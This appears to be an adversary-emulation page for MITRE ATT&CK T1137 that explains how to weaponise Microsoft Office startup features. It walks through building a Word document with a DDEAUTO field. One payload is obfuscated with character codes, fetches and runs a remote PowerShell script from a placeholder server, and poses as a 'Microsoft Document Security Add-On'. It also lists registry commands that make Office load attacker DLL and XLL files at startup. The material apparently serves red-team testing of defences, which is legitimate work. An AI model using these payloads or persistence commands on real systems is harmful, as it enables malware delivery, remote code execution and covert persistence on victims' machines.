# Office Application Startup

MITRE ATT&CK Technique: [T1137](https://attack.mitre.org/wiki/Technique/T1137)


## DDEAUTO

1. Open Word
2. Insert tab -> Quick Parts -> Field
3. Choose = (Formula) and click ok.
4. Once the field is inserted, you should now see "!Unexpected End of Formula"
5. Right-click the Field, choose "Toggle Field Codes"
6. Paste in the code from Unicorn or SensePost
7. Save the Word document.

* [SensePost DDEAUTO](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/)

    DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"

* [TrustedSec - Unicorn](https://github.com/trustedsec/unicorn)

Generate the payload and download.ps1 following the Unicorn instructions, or to make one "just work", follow the steps below.

    DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\v1.0\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # " "Microsoft Document Security Add-On"

## Word VBA Macro

[Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)

## Office Test

`reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\Users\<username>\evil.dll`

## Excel XLL

`reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Excel\Options" /v OPEN /t REG_SZ /d "/R evil.xll"`
